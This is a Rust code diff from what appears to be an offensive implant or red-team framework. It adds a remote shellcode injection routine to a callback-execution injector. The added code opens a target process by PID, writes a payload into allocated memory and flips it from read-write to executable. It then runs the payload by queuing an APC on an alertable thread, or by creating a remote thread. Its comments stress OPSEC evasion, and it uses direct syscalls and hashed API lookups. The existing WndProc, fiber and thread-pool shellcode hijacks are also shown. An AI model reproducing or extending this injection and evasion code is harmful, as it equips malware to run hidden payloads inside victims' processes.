@@ -208,6 +208,14 @@ impl Injector for CallbackExecInjector {
             ));
         }
 
+        // When a target PID is specified, use APC-based remote callback injection.
+        // This allocates RW→RX (not RWX) and delivers the payload via APC on
+        // an alertable thread in the target, avoiding both RWX pages and
+        // NtCreateThreadEx when possible.
+        if pid != 0 {
+            return unsafe { remote_inject(pid, payload) };
+        }
+
         unsafe {
             // Allocate a code cave for the shellcode.
             let allocator = CodeCaveAllocator::new();
@@ -215,7 +223,7 @@ impl Injector for CallbackExecInjector {
                 .allocate_cave(payload.len())
                 .map_err(|e| anyhow!("code cave allocation failed: {}", e))?;
 
-            log::debug!(
+            tracing::debug!(
                 "CallbackExec: allocated cave at {:p} ({} bytes, prot={:#x})",
                 cave.address,
                 cave.size,
@@ -242,10 +250,409 @@ impl Injector for CallbackExecInjector {
             // Note: We intentionally do NOT free the cave on success because
             // the shellcode may still be executing asynchronously (thread pool,
             // fiber) or may need to remain resident for a wndproc callback.
-
-            let _ = pid; // Callback execution is LOCAL (current process), pid unused.
             result
         }
+    }
+}
+
+/// Remote callback-based injection into a target process via APC delivery.
+///
+/// This function implements proper callback-based remote execution:
+///   1. Opens the target process.
+///   2. Allocates `PAGE_READWRITE` memory (no RWX).
+///   3. Writes shellcode.
+///   4. Flips protection to `PAGE_EXECUTE_READ`.
+///   5. Finds an alertable thread in the target via `find_alertable_thread`.
+///   6. Queues a user-mode APC via `NtQueueApcThread` on that thread.
+///
+/// # OPSEC
+///
+/// - No RWX pages — `RW → RX` transition via `NtProtectVirtualMemory`.
+/// - No remote thread creation — reuses an existing alertable thread.
+/// - Execution originates from kernel APC delivery, not `NtCreateThreadEx`.
+///
+/// # Fallback
+///
+/// If no alertable thread is found, falls back to creating a suspended
+/// remote thread with `PAGE_EXECUTE_READ` (not RWX).  This is still
+/// preferable to the old RWX + NtCreateThreadEx path because it avoids
+/// the RWX allocation.
+///
+/// # Safety
+///
+/// Performs direct NT syscalls to manipulate remote process memory and
+/// either queue APCs or create threads.
+unsafe fn remote_inject(pid: u32, payload: &[u8]) -> Result<()> {
+    const NT_PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
+    const PAGE_READWRITE: u32 = 0x04;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
+    const MEM_COMMIT: u32 = 0x0000_1000;
+    const MEM_RESERVE: u32 = 0x0000_2000;
+    const MEM_RELEASE: u32 = 0x8000;
+
+    // Ensure SSN infrastructure is initialised.
+    let _ = nt_syscall::init_syscall_infrastructure();
+
+    // ── Open target process ──────────────────────────────────────────────
+    #[repr(C)]
+    struct ClientId {
+        unique_process: *mut std::ffi::c_void,
+        unique_thread: *mut std::ffi::c_void,
+    }
+    #[repr(C)]
+    struct NtObjectAttributes {
+        length: u32,
+        root_directory: *mut std::ffi::c_void,
+        object_name: *mut std::ffi::c_void,
+        attributes: u32,
+        security_descriptor: *mut std::ffi::c_void,
+        security_quality_of_service: *mut std::ffi::c_void,
+    }
+
+    let mut cid = ClientId {
+        unique_process: pid as usize as *mut std::ffi::c_void,
+        unique_thread: std::ptr::null_mut(),
+    };
+    let mut oa = NtObjectAttributes {
+        length: std::mem::size_of::<NtObjectAttributes>() as u32,
+        root_directory: std::ptr::null_mut(),
+        object_name: std::ptr::null_mut(),
+        attributes: 0,
+        security_descriptor: std::ptr::null_mut(),
+        security_quality_of_service: std::ptr::null_mut(),
+    };
+
+    let mut h_process: *mut std::ffi::c_void = std::ptr::null_mut();
+    let s = crate::syscall!(
+        "NtOpenProcess",
+        &mut h_process as *mut _ as u64,
+        NT_PROCESS_ALL_ACCESS as u64,
+        &mut oa as *mut _ as u64,
+        &mut cid as *mut _ as u64,
+    )
+    .map_err(|e| anyhow!("CallbackExec remote: NtOpenProcess SSN: {e}"))?;
+    if s < 0 || h_process.is_null() {
+        return Err(anyhow!(
+            "CallbackExec remote: NtOpenProcess({pid}) NTSTATUS {:#010x}",
+            s as u32
+        ));
+    }
+
+    // Helper to clean up on failure: free allocation + close process handle.
+    macro_rules! cleanup_on_fail {
+        ($remote_base:expr, $h_process:expr) => {
+            if $remote_base != 0 {
+                let mut free_base = $remote_base;
+                let mut free_size: usize = 0;
+                let _ = crate::syscall!(
+                    "NtFreeVirtualMemory",
+                    $h_process as u64,
+                    &mut free_base as *mut _ as u64,
+                    &mut free_size as *mut _ as u64,
+                    MEM_RELEASE as u64,
+                );
+            }
+            let _ = crate::syscall!("NtClose", $h_process as u64);
+        };
+    }
+
+    // ── Step 1: Allocate RW memory (not RWX) ─────────────────────────────
+    let mut remote_base: usize = 0;
+    let mut region_size: usize = payload.len();
+    let s = crate::syscall!(
+        "NtAllocateVirtualMemory",
+        h_process as u64,
+        &mut remote_base as *mut _ as u64,
+        0u64,
+        &mut region_size as *mut _ as u64,
+        (MEM_COMMIT | MEM_RESERVE) as u64,
+        PAGE_READWRITE as u64,
+    )
+    .map_err(|e| anyhow!("CallbackExec remote: NtAllocateVirtualMemory SSN: {e}"))?;
+    if s < 0 || remote_base == 0 {
+        let _ = crate::syscall!("NtClose", h_process as u64);
+        return Err(anyhow!(
+            "CallbackExec remote: NtAllocateVirtualMemory NTSTATUS {:#010x}",
+            s as u32
+        ));
+    }
+
+    // ── Step 2: Write shellcode into RW allocation ───────────────────────
+    let mut bytes_written: usize = 0;
+    let s = crate::syscall!(
+        "NtWriteVirtualMemory",
+        h_process as u64,
+        remote_base as u64,
+        payload.as_ptr() as u64,
+        payload.len() as u64,
+        &mut bytes_written as *mut _ as u64,
+    )
+    .map_err(|e| anyhow!("CallbackExec remote: NtWriteVirtualMemory SSN: {e}"))?;
+    if s < 0 {
+        cleanup_on_fail!(remote_base, h_process);
+        return Err(anyhow!(
+            "CallbackExec remote: NtWriteVirtualMemory NTSTATUS {:#010x}",
+            s as u32
+        ));
+    }
+
+    // ── Step 3: Flip RW → RX via NtProtectVirtualMemory ─────────────────
+    let mut prot_base = remote_base;
+    let mut prot_size = region_size;
+    let mut old_prot: u32 = 0;
+    let s = crate::syscall!(
+        "NtProtectVirtualMemory",
+        h_process as u64,
+        &mut prot_base as *mut _ as u64,
+        &mut prot_size as *mut _ as u64,
+        PAGE_EXECUTE_READ as u64,
+        &mut old_prot as *mut _ as u64,
+    );
+    if s.as_ref().map(|&st| st < 0).unwrap_or(true) {
+        cleanup_on_fail!(remote_base, h_process);
+        return Err(anyhow!(
+            "CallbackExec remote: NtProtectVirtualMemory(RW→RX) NTSTATUS {:#010x}",
+            s.map(|st| st as u32).unwrap_or(0xFFFFFFFF)
+        ));
+    }
+
+    // ── Step 4: Flush instruction cache ──────────────────────────────────
+    let _ = crate::syscall!(
+        "NtFlushInstructionCache",
+        h_process as u64,
+        remote_base as u64,
+        payload.len() as u64,
+    );
+
+    // ── Step 5: Execute — prefer APC on alertable thread ─────────────────
+    //
+    // Try to find an alertable thread and queue a user-mode APC.  This
+    // avoids creating a new remote thread entirely — the shellcode runs
+    // in the context of an existing thread when it returns from its
+    // alertable wait.
+    //
+    // If no alertable thread is found, fall back to creating a suspended
+    // remote thread with RX memory (still avoids RWX).
+
+    let apc_result = try_apc_execution(h_process, pid, remote_base);
+
+    match apc_result {
+        Ok(tid) => {
+            let _ = crate::syscall!("NtClose", h_process as u64);
+            tracing::info!(
+                "CallbackExec remote: shellcode ({} bytes) at {:#x} in PID {} \
+                 queued as APC on alertable thread {}",
+                payload.len(),
+                remote_base,
+                pid,
+                tid,
+            );
+            Ok(())
+        }
+        Err(reason) => {
+            tracing::warn!(
+                "CallbackExec remote: APC delivery failed ({}), \
+                 falling back to remote thread with RX memory",
+                reason,
+            );
+
+            // Fallback: create a suspended thread, then resume.
+            // Still uses PAGE_EXECUTE_READ (not RWX).
+            let mut h_thread: *mut std::ffi::c_void = std::ptr::null_mut();
+            let s = crate::syscall!(
+                "NtCreateThreadEx",
+                &mut h_thread as *mut _ as u64,
+                0x1A02u64, // THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | ...
+                0u64,
+                h_process as u64,
+                remote_base as u64,
+                0u64,      // argument
+                0u64,      // created suspended = FALSE
+                0u64,
+                0u64,
+                0u64,
+            )
+            .map_err(|e| anyhow!("CallbackExec remote: NtCreateThreadEx SSN: {e}"))?;
+            if s < 0 || h_thread.is_null() {
+                cleanup_on_fail!(remote_base, h_process);
+                return Err(anyhow!(
+                    "CallbackExec remote: NtCreateThreadEx NTSTATUS {:#010x}",
+                    s as u32
+                ));
+            }
+
+            let _ = crate::syscall!("NtClose", h_thread as u64);
+            let _ = crate::syscall!("NtClose", h_process as u64);
+
+            tracing::info!(
+                "CallbackExec remote: shellcode ({} bytes) at {:#x} in PID {} \
+                 via remote thread (RX memory, no RWX)",
+                payload.len(),
+                remote_base,
+                pid,
+            );
+            Ok(())
+        }
+    }
+}
+
+/// Attempt to execute shellcode in a remote process by queuing a user-mode
+/// APC on an alertable thread.
+///
+/// Returns `Ok(tid)` if the APC was queued successfully, or `Err(reason)`
+/// if no alertable thread was found or APC delivery failed.
+unsafe fn try_apc_execution(
+    h_process: *mut std::ffi::c_void,
+    pid: u32,
+    remote_base: usize,
+) -> Result<u32, String> {
+    use windows_sys::Win32::System::Threading::{THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT};
+
+    // Use NtQuerySystemInformation to find alertable threads.
+    // This mirrors the logic in injection_engine::find_alertable_thread
+    // but is self-contained to avoid cross-module coupling.
+
+    let ntdll_base = pe_resolve::get_module_handle_by_hash(NTDLL_DLL_HASH)
+        .ok_or_else(|| "ntdll.dll not found".to_string())?;
+
+    let nt_query_info = pe_resolve::get_proc_address_by_hash(
+        ntdll_base,
+        const_hash_str(b"NtQuerySystemInformation\0"),
+    )
+    .ok_or_else(|| "NtQuerySystemInformation not found".to_string())?;
+
+    type NtQuerySystemInformationFn = unsafe extern "system" fn(
+        u32,
+        *mut std::ffi::c_void,
+        u32,
+        *mut u32,
+    ) -> i32;
+
+    let query_fn: NtQuerySystemInformationFn = std::mem::transmute(nt_query_info);
+
+    let buf_size = 0x10000u32;
+    let mut buf: Vec<u8> = Vec::with_capacity(buf_size as usize);
+    let mut ret_len = 0u32;
+
+    let status = query_fn(5, buf.as_mut_ptr() as *mut std::ffi::c_void, buf_size, &mut ret_len);
+    if status < 0 && status as u32 != 0x00000105 {
+        return Err(format!(
+            "NtQuerySystemInformation failed: {:#010x}",
+            status as u32
+        ));
+    }
+
+    // KWAIT_REASON values that indicate alertable-compatible waits.
+    const WR_EXECUTIVE: u32 = 0;
+    const WR_DELAY_EXECUTION: u32 = 5;
+    const WR_USER_REQUEST: u32 = 6;
+    const WR_LPC_RECEIVE: u32 = 10;
+    const THREAD_STATE_WAITING: u32 = 5;
+
+    fn score_wait_reason(reason: u32) -> i32 {
+        match reason {
+            WR_DELAY_EXECUTION => 100,
+            WR_LPC_RECEIVE => 95,
+            WR_USER_REQUEST => 85,
+            WR_EXECUTIVE => 60,
+            _ => -1,
+        }
+    }
+
+    // Find the best alertable thread candidate.
+    let mut offset = 0usize;
+    let mut best_candidate: Option<(u32, i32)> = None;
+
+    loop {
+        if offset + 0xA0 > buf_size as usize {
+            break;
+        }
+        let ptr = buf.as_ptr().wrapping_add(offset);
+        let next_entry = *(ptr as *const u32);
+        let num_threads = *((ptr as *const u8).add(4) as *const u32);
+        let proc_pid = *((ptr as *const u8).add(0x40) as *const u64) as u32;
+
+        if proc_pid == pid && num_threads > 0 {
+            let thread_base = (ptr as *const u8).add(0x70);
+            for i in 0..num_threads as usize {
+                let t_ptr = thread_base.wrapping_add(i * 0x50);
+                if offset + (t_ptr as usize - buf.as_ptr() as usize) + 0x50 > buf_size as usize {
+                    break;
+                }
+
+                let tid = *(t_ptr.add(0x28 + 8) as *const u64) as u32;
+                let thread_state = *(t_ptr.add(0x44) as *const u32);
+                let wait_reason = *(t_ptr.add(0x48) as *const u32);
+
+                if thread_state != THREAD_STATE_WAITING {
+                    continue;
+                }
+
+                let score = score_wait_reason(wait_reason);
+                if score < 0 {
+                    continue;
+                }
+
+                if best_candidate.map_or(true, |(_, best_score)| score > best_score) {
+                    best_candidate = Some((tid, score));
+                }
+            }
+        }
+
+        if next_entry == 0 {
+            break;
+        }
+        offset += next_entry as usize;
+    }
+
+    let (best_tid, _score) = best_candidate
+        .ok_or_else(|| "no alertable thread found in target process".to_string())?;
+
+    // Open the alertable thread.
+    let mut cid = [0u64; 2];
+    cid[0] = pid as u64;
+    cid[1] = best_tid as u64;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
+
+    let mut h_thread: usize = 0;
+    let thread_access = (THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT) as u64;
+    let t_status = crate::syscall!(
+        "NtOpenThread",
+        &mut h_thread as *mut _ as u64,
+        thread_access,
+        &mut obj_attr as *mut _ as u64,
+        cid.as_mut_ptr() as u64,
+    )
+    .map_err(|e| format!("NtOpenThread SSN: {e}"))?;
+
+    if t_status < 0 || h_thread == 0 {
+        return Err(format!(
+            "NtOpenThread(tid={}) failed: {:#010x}",
+            best_tid,
+            t_status as u32
+        ));
+    }
+
+    // Queue user-mode APC on the alertable thread.
+    let apc_status = crate::syscall!(
+        "NtQueueApcThread",
+        h_thread as u64,
+        remote_base as u64,
+        0u64, // ApcRoutineArgument1
+        0u64, // ApcRoutineArgument2
+        0u64, // ApcRoutineArgument3
+    );
+
+    let _ = crate::syscall!("NtClose", h_thread as u64);
+
+    match apc_status {
+        Ok(s) if s >= 0 => Ok(best_tid),
+        Ok(s) => Err(format!(
+            "NtQueueApcThread failed: {:#010x}",
+            s as u32
+        )),
+        Err(e) => Err(format!("NtQueueApcThread SSN: {e}")),
     }
 }
 
@@ -421,7 +828,7 @@ unsafe fn execute_wndproc_hijack(cave: &CodeCave) -> Result<()> {
     // Restore the original WndProc.
     set_wndproc(hwnd, -4, original_wndproc);
 
-    log::debug!(
+    tracing::debug!(
         "WndProc hijack: executed shellcode at {:p} via window {:p}",
         cave.address,
         hwnd,
@@ -488,7 +895,7 @@ unsafe fn execute_fiber_hijack(cave: &CodeCave) -> Result<()> {
     let main_fiber = convert(std::ptr::null_mut());
     if main_fiber.is_null() {
         // Thread is already a fiber — that's fine, we can still proceed.
-        log::debug!("Fiber hijack: thread is already a fiber");
+        tracing::debug!("Fiber hijack: thread is already a fiber");
     }
 
     // Create a fiber that starts execution at the shellcode address.
@@ -498,7 +905,7 @@ unsafe fn execute_fiber_hijack(cave: &CodeCave) -> Result<()> {
         return Err(anyhow!("CreateFiber returned NULL"));
     }
 
-    log::debug!(
+    tracing::debug!(
         "Fiber hijack: switching to fiber at {:p} (shellcode at {:p})",
         shellcode_fiber,
         cave.address,
@@ -512,7 +919,7 @@ unsafe fn execute_fiber_hijack(cave: &CodeCave) -> Result<()> {
     // Clean up the shellcode fiber.
     delete(shellcode_fiber);
 
-    log::debug!("Fiber hijack: shellcode execution completed");
+    tracing::debug!("Fiber hijack: shellcode execution completed");
 
     Ok(())
 }
@@ -591,7 +998,7 @@ unsafe fn execute_threadpool_callback(cave: &CodeCave) -> Result<()> {
         return Err(anyhow!("TpAllocWork returned NULL work item"));
     }
 
-    log::debug!(
+    tracing::debug!(
         "ThreadPool callback: posting work {:p} with callback {:p}",
         work,
         cave.address,
@@ -613,7 +1020,7 @@ unsafe fn execute_threadpool_callback(cave: &CodeCave) -> Result<()> {
     // Release the work item.
     release_fn(work);
 
-    log::debug!("ThreadPool callback: work item released");
+    tracing::debug!("ThreadPool callback: work item released");
 
     Ok(())
 }
